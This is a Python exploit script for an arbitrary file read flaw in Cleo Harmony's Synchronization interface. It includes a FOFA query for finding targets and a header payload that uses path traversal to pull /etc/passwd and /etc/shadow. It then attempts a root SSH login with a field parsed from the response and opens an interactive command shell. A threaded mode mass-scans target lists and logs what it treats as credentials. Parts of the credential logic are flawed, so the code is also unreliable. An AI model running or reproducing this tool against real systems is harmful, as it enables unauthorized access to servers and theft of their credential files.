"""
-*- coding: utf-8 -*-
@Project : Cleo Harmony's Synchronization interface has an arbitrary file read vulnerability
@Author  : wodelilian
@Date    : 2025/3/17 18:19
Software : PyCharm
version  : Python 3.10
@File    : Cleo_readfile.py
@fofa    : body="packages/partnerlogos/userportal_logo"
"""
import re
import requests
import argparse
import paramiko
from concurrent.futures import ThreadPoolExecutor
import urllib3


urlpath = 'Synchronization'
payload = 'l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
    'Retrieve': 'l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/shadow'
}
urllib3.disable_warnings()  # Block alarms


def getip(url):
    """
    Retrieve the IP address from the URL
    :param url: Link Address
    :return: IP Address
    """
    pattern = r'\d+\.\d+\.\d+\.\d+'
    match = re.findall(pattern, url)
    IP = str(match).replace("'","")
    IP = IP.replace('[','')
    IP = IP.replace(']','')
    return IP


def checktarget(pattern, url):
    """
    :param pattern: Leakage scanning mode: alone/list
    :param url: target URL
    :return:
    """
    if str(pattern) == 'alone':
        if str(url[-1]) != "/":
            url = url + "/" + urlpath
        else:
            pass
        try:
            response = requests.get(url=url, headers=headers, verify=False, timeout=20)
            state = response.status_code
            if state == 200:
                print('Response successful, there may be a vulnerability in the target address, try to obtain more configuration file information\n')
                responseinfo = re.findall(r'root', response.text)
                passwd = response.text.split(":")[1]
                user = response.text.split(":")[0]
                if len(responseinfo) != 0:
                    f = open('etcpasswd.txt', 'w')
                    f.write(response.text)
                    f.close()
                    print("The data has been written to etcpassd.txt in the current path. Please check carefully")
                else:
                    print("The current IP execution failed, the vulnerability may not exist!")
                try:
                    hostname = getip(url)
                    if hostname != "":
                        SSHclient(hostname, passwd)
                    else:
                        print("Failed to extract IP information")
                except Exception as e:
                    print(e)
                    print('Failed to establish interactive command shell')
        except Exception as e:
            print(e)
            print('The current IP execution failed, the vulnerability may not exist!')
    else:
        list = openfile(url)
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(batch, list)



def SSHclient(hostname, password):
    """
    Establishing a SSH connection
    :param hostname: Attack IP
    :param password: Attack Password
    :return: NULL
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=hostname, port=22, username='root', password=password, timeout=20)
    try:
        while True:
            command = input("Please enter the command: ")
            if command != "exit":
                stdin, stdout, stderr = ssh.exec_command(command)
                output = stdout.read().decode()
                error = stderr.read().decode()
                print("Results of execution:", output)
                if error:
                    print("Error message:", error)
            else:
                exit()
    except paramiko.AuthenticationException:
        print("Authentication failed: username or password incorrect")
    except paramiko.SSHException as e:
        print(f"SSH connection exception：{str(e)}")
    finally:
        ssh.close()


def batch(url):
    """
    Batch testing
    :param url: Attack URL List
    :return: result
    """
    try:
        if str(url[-1]) != "/":
            url = url + "/" + urlpath
        else:
            pass
        f = open('scanresults.txt', 'a')
        response = requests.get(url=url, headers=headers, verify=False, timeout=20)
        state = response.status_code
        passwd = response.text.split(":")[1]
        user = response.text.split(":")[0]
        html = re.findall(r'html', response.text)
        if state == 200:
            responseinfo = re.findall(passwd, response.text)
            if len(responseinfo) != 0 :
                if len(html) == 0:
                    print('The current URL may have vulnerabilities, please verify manually：' + url)
                    result = ('The current URL may have vulnerabilities, please verify manually：' + url + '  uxername:' + user + '  password:' + passwd + '\n')
                    f.write(result)
                else:
                    print("There is no vulnerability in the current URL，PASS")
            else:
                print("There is no vulnerability in the current URL，PASS")
        else:
            print("There is no vulnerability in the current URL，PASS")
        f.close()
    except Exception as e:
        if "timeout" in str(e):
            print(url + "   timeout")
        else:
            print("Program exception" + str(e))


def openfile(filepath):
    """
    :param filepath: Enter the target URL file path
    :return: Return the URL in the file
    """
    urllist = []
    with open(filepath) as f:
        for url in f.readlines():
            url = url.replace("\n", "")
            if url != "":
                urllist.append(url)
    return urllist


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='python3 Cleo_readfile.py -r [Pattern(alone list)] -u [IP Address] ',
        epilog='python3 -r alone -u http://127.0.0.1 or python3 -r list -u filename')
    parser.add_argument('-r', '--run',  help='Pattern(alone list)')
    parser.add_argument('-u', '--url',  help='Destination IP address or IP filepath')
    args = parser.parse_args()
    pattern = args.run
    url = args.url
    print(
        f"Author: Wodelilian\n"
    )
    checktarget(pattern, url)
